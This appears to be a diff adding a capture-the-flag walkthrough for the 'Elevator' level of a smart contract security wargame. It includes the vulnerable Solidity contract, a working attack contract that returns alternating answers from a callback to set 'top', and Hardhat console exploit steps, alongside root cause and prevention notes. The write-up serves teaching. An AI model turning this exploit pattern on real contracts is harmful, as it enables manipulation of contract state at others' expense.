@@ -665,3 +665,146 @@ await contract._king(); // => kingAttack address
 - **`transfer`/`send` vs `call`**
 - **Checks-Effects-Interactions**
 - **Denial-of-Service via unexpected revert**
+
+## 🪙 Level 10: Elevator
+
+### Overview
+
+The `Elevator` contract asks an external contract (treated as `Building`) whether a floor is the last one. It calls `isLastFloor` twice and makes a decision based on the answers. Because it fully trusts the external response, an attacker can return different answers on each call to set `top = true`.
+
+**Goal:** Reach the top floor by setting `top = true`.
+
+---
+
+### 🔓 Vulnerable Contract (simplified)
+
+<details>
+<summary><code>contract Elevator {</code></summary>
+
+```solidity
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        if (!Building(msg.sender).isLastFloor(_floor)) {
+            floor = _floor;
+            top = Building(msg.sender).isLastFloor(floor);
+        }
+    }
+}
+```
+
+</details>
+
+---
+
+### 🔍 Vulnerability Analysis
+
+- **Untrusted callback controls logic:** The contract trusts `Building(msg.sender)` to answer security-critical questions.
+- **Inconsistent responses enable bypass:** Because `isLastFloor` is not `view`, the callee can return `false` first and `true` later in the same transaction.
+- **Double-check pattern is exploitable:** The second call can differ from the first, allowing `top` to be set to `true`.
+
+---
+
+### 🛡️ Attack Contract
+
+<details>
+<summary><code>// ElevatorAttack.sol</code></summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint256 _floor) external;
+    function top() external view returns (bool);
+}
+
+contract ElevatorAttack {
+    IElevator public target;
+    bool private toggled;
+
+    constructor(address _target) {
+        target = IElevator(_target);
+    }
+
+    function attack(uint256 _floor) external {
+        target.goTo(_floor);
+        require(target.top(), "Not at top");
+    }
+
+    // Called by Elevator via Building(msg.sender)
+    function isLastFloor(uint256) external returns (bool) {
+        bool answer = toggled; // false on first call, true on second
+        toggled = !toggled;
+        return answer;
+    }
+}
+```
+
+</details>
+
+---
+
+### 🧪 Exploitation Steps
+
+1. Deploy `ElevatorAttack` with the target `Elevator` address.
+2. Call `attack(1)` to trigger `goTo(1)`.
+3. The first `isLastFloor` returns `false` → contract sets `floor`.
+4. The second `isLastFloor` returns `true` → contract sets `top = true`.
+5. Verify `top` is now `true`.
+
+---
+
+### 📚 Detailed Explanation
+
+- The `Elevator` contract expects the caller to implement `isLastFloor`. By initiating the call from our attack contract, `msg.sender` inside `Elevator` is our contract, so `Elevator` calls back into us.
+- Because `isLastFloor` is not marked `view`, the implementation can track state and alternate answers across calls within the same transaction.
+- Returning `false` first and `true` second satisfies the `Elevator` logic to set `top = true`.
+
+---
+
+### 🪲 Root Cause
+
+Trusting an untrusted external callback for a security-critical decision without constraining behavior (e.g., requiring `view`/determinism) or establishing a trusted `Building` address.
+
+---
+
+### 🛡️ Prevention
+
+- Avoid trusting callbacks from arbitrary callers for critical logic.
+- If callbacks are unavoidable, constrain them (e.g., `view`/`pure`) and enforce a trusted `Building` address set by the owner.
+- Validate invariants independently rather than relying entirely on external responses.
+
+---
+
+### 🧪 Complete Exploit (Console)
+
+<details>
+<summary><code>// Hardhat/Foundry console</code></summary>
+
+```js
+// instance = address of the deployed Elevator level instance
+const Attack = await ethers.getContractFactory("ElevatorAttack");
+const attack = await Attack.deploy(instance);
+await attack.deployed();
+
+await attack.attack(1);
+const elevator = await ethers.getContractAt("Elevator", instance);
+console.log("top:", await elevator.top()); // true
+```
+
+</details>
+
+---
+
+### 🔗 Related Concepts
+
+- Callback-based design and trust boundaries
+- Determinism (`view`/`pure`) in external interfaces
+- Cross-contract control flow and reentrancy-like logic pitfalls
